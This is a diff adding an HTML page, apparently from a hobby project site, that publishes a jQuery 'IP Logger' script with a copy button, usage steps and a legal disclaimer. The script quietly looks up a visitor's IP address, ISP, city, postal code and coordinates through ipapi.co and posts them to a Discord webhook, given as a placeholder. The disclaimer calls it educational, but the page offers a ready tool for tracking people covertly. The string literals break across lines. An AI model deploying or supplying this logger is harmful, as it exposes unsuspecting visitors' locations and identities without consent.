@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Source Archive | J Projects</title>
+    <link rel="stylesheet" href="../css/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        .code-container {
+            background: #050505;
+            border: 1px solid var(--border);
+            border-radius: 1.25rem;
+            padding: 2rem;
+            position: relative;
+            box-shadow: inset 0 0 30px rgba(0, 0, 0, 0.5);
+        }
+
+        .code-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1.5rem;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            padding-bottom: 1rem;
+        }
+
+        .disclaimer-box {
+            background: rgba(239, 68, 68, 0.05); 
+            border-left: 3px solid #ef4444; 
+            padding: 1.25rem; 
+            margin-bottom: 2rem; 
+            border-radius: 4px;
+        }
+
+        pre {
+            margin: 0;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            line-height: 1.6;
+            color: #d1d5db;
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            .code-container { padding: 1rem; }
+            pre { font-size: 0.75rem; }
+        }
+    </style>
+</head>
+<body>
+    <nav class="sidebar">
+        <div class="brand">
+            <h1>J_Projects <span style="font-size: 0.5rem; display: block; opacity: 0.5; margin-top: 4px;">SOURCE_ARCHIVE_v1.0</span></h1>
+        </div>
+        
+        <ul style="list-style: none; padding: 0; margin: 30px 0;">
+            <li>
+                <a href="../index.html" style="color: var(--text-dim); text-decoration: none; font-size: 0.8rem; font-weight: bold;">
+                    ← DASHBOARD
+                </a>
+            </li>
+        </ul>
+
+        <div class="control-panel">
+            <span class="label-text">Archive Status</span>
+            <button class="execute-btn" onclick="copyCode()">COPY_RAW_SRC</button>
+        </div>
+    </nav>
+
+    <main class="main-content">
+        <header style="margin-bottom: 3rem;">
+            <h2 style="text-transform: uppercase; letter-spacing: 0.2em; color: var(--emerald); font-weight: 800;">Source Data: IP Logger</h2>
+            <p style="color: var(--text-dim); font-size: 0.85rem; margin-top: 0.5rem;">Verified JavaScript snippet for automated node metadata reporting.</p>
+        </header>
+
+        <section class="code-container">
+            <!-- LEGAL_NOTICE -->
+            <div class="disclaimer-box">
+                <span class="label-text" style="color: #ef4444; margin-bottom: 0.5rem;">⚠️ LEGAL_DISCLAIMER & USAGE_NOTICE</span>
+                <p style="color: #94a3b8; font-size: 0.75rem; line-height: 1.5; margin: 0;">
+                    This source code is provided for <strong>educational and authorized diagnostic purposes only</strong>. 
+                    Unauthorized interception of network data or tracking of users without explicit consent is a violation of 
+                    privacy laws and Discord's Terms of Service. By utilizing this snippet, you assume full responsibility 
+                    for ensuring your implementation remains compliant with local regulations and ethical standards. 
+                    J_PROJECTS accepts no liability for misuse of any kind.
+                </p>
+            </div>
+
+            <div class="code-header">
+                <span class="label-text" style="margin: 0;">js/ip_logger.js</span>
+                <span class="label-text" style="opacity: 0.3; font-size: 0.6rem;">UTF-8 // JQUERY_DEP</span>
+            </div>
+            
+            <pre id="codeBlock">Usage: Replace the placeholder with your specific Discord Webhook URL. 
+Setup a simple .html page and make sure to link to the right .js file or keep it on the page.
+// IP Logger
+$(document).ready(function() {
+  // Get user information using IPAPI
+  $.get("https://ipapi.co/json/", function(data) {
+      // Send user information to Discord webhook
+      var formattedData = "**IP: **" + data.ip + "
+" +
+                          "**Network: **" + data.network + "
+" +
+                          "**Version: **" + data.version + "
+" +
+                          "**ASN: **" + data.asn + "
+" +
+                          "**ISP: **" + data.org + "
+" +
+                          "**City: **" + data.city + "
+" +
+                          "**Postal Code: **" + data.postal + "
+" +
+                          "**Region: **" + data.region + "
+" +
+                          "**Country: **" + data.country_name + "
+" +
+                          "**Capital: **" + data.country_capital + "
+" +
+                          "**Country Population: **" + data.country_population + "
+" +
+                          "**Calling Code: **" + data.country_calling_code + "
+" +
+                          "**Latitude: **" + data.latitude + "
+" +
+                          "**Longitude: **" + data.longitude + "
+" +
+                          "**Timezone: **" + data.timezone + "
+" +
+                          "**Currency: **" + data.currency + "
+";
+
+      $.ajax({
+          type: "POST",
+          url: "https://discord.com/api/webhooks/your-webhook-url",
+          data: JSON.stringify({ content: formattedData }),
+          contentType: "application/json"
+      });
+  });
+});</pre>
+        </section>
+    </main>
+
+    <script>
+        function copyCode() {
+            const code = document.getElementById('codeBlock').innerText;
+            navigator.clipboard.writeText(code).then(() => {
+                const btn = document.querySelector('.execute-btn');
+                const originalText = btn.innerText;
+                btn.innerText = "COPIED_TO_BUFFER";
+                setTimeout(() => btn.innerText = originalText, 2000);
+            }).catch(err => {
+                console.error('Buffer Uplink Failed:', err);
+                alert("PROTOCOL_ERROR: CLIPBOARD_ACCESS_DENIED");
+            });
+        }
+    </script>
+</body>
+</html>
